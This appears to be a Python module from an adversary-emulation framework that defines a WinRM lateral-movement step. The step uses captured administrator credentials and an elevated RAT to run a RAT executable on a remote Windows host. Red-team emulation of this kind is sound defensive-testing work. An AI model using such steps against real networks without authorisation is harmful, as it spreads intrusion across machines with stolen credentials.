from plugins.adversary.app.commands import winrm
from plugins.adversary.app.operation.operation import Step, OPRat, OPFile, OPHost, OPVar, OPCredential, OPUser, OPDomain


class WinRM(Step):
    """
    Description:
        This step attempts to move laterally between to machines utilizing WinRM. This assumes that
        WinRM is enabled on the target machine in order to function (PS: Enable-PSRemoting -Force)
    Requirements:
        Requires an elevated Rat.
    """
    attack_mapping = [('T1028', 'Lateral Movement'), ('T1028', 'Execution')]
    display_name = "WinRM"
    summary = "Attempts to use WinRM to move to a remote computer"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("dest_host", OPHost),
                     ('rat_file', OPFile({'host': OPVar('dest_host'), 'use_case': 'rat'})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                       "executable": OPVar("rat_file.path")}))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['domain.windows_domain']

    postproperties = []

    significant_parameters = []

    @staticmethod
    def description(dest_host, user):
        return "Executing WinRM lateral movement to {} as {}".format(dest_host.fqdn, user.username)

    @staticmethod
    async def simulate(operation, rat, dest_host, rat_file, cred, user, domain, rat_g):
        return True

    @staticmethod
    async def action(operation, rat, dest_host, rat_file, cred, user, domain, rat_g):
        await operation.execute_shell_command(rat, *winrm.lateral_movement(dest_host.fqdn, cred.password,
                                                                           domain.windows_domain, user.username,
                                                                           rat_file.path))
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner):
        pass